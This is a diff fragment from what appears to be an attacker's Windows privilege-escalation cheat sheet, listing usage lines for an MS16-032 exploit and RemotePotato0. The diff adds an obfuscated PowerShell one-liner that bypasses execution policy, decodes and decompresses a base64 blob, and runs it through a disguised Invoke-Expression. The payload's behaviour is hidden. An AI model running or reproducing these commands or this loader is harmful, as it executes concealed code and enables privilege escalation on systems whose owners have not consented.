@@ -32,3 +32,6 @@ Usage: MS16_032.exe calc.exe OR MS16_032.exe cmd.exe \"/c clac.exe\"
 
 RemotePotato0.exe -m 2 -s 1
 RemotePotato0.exe -m 3 -l 9997
+
+pOweRshELL  -exeCUTiONpoLiC BYPAsS   " &( ([STrinG]$VERboSePreFERencE)[1,3]+'x'-JoIN'')( NEW-oBject  iO.coMprESsiOn.DeFLATEStREAm( [SYstEM.iO.MemorystREAM] [CONvERt]::FRombAsE64StriNg('bVRNa8JAEP0rcyiYQITZHnrw5sFiKMQSeyiI9CBS2oNCFS+1/73ZmZ2vqChudmfnvZn3JhVUkBDzFxpICdPwgybRCmUn5R3MS9rJq4YC8jPSM93Ja748fHIoxeqdcjRksX+CbgIMA+cUOVkO4Gc6UHiOFBp8TIkIkukiOGzgs3KVczuMpCWMeA4rh0pwOVnplBKLRVJ+H1TYjsgICS2d++f0sHBBUfIS5JgQWS8araytihGExVIzGu1QvQip1AIfLBDI6oMWZjvWEO1nsEiSEykn6b9CgyOaFLK4lTgwK+mcChdIhNaHvWIB9be6t9jG9+yOHDYXd45UIXVgSFSmyeCdF0UfrV8AvEnlwGqIwpnIYEDIEoQG34grefyUodpg1HgEb5lyxZAdF54Te4Mk0ooZqYViV3w2G5FkvRU/8zzJzI3TubkS7zdB6MZDGbaKLq9Ck/XGzJoI1dI5VQ3X51W/n++W8Du8dje7VXfZ9+ftbHY+todzeqqg2qzf+q/uc/vwUTePUE/npyFuOe+39V8N0+9j200mV2i7y/FlMV28v/7s16d2dfgH'),[iO.coMprEsSion.COmpREsSionmOdE]::deCoMpRESS)|ForeACh-objEct { NEW-oBject systeM.Io.stReaMReADER($_ , [TeXt.ENcoDIng]::aScII) } | FoReach-ObJeCt { $_.rEADToENd( )} )"
+
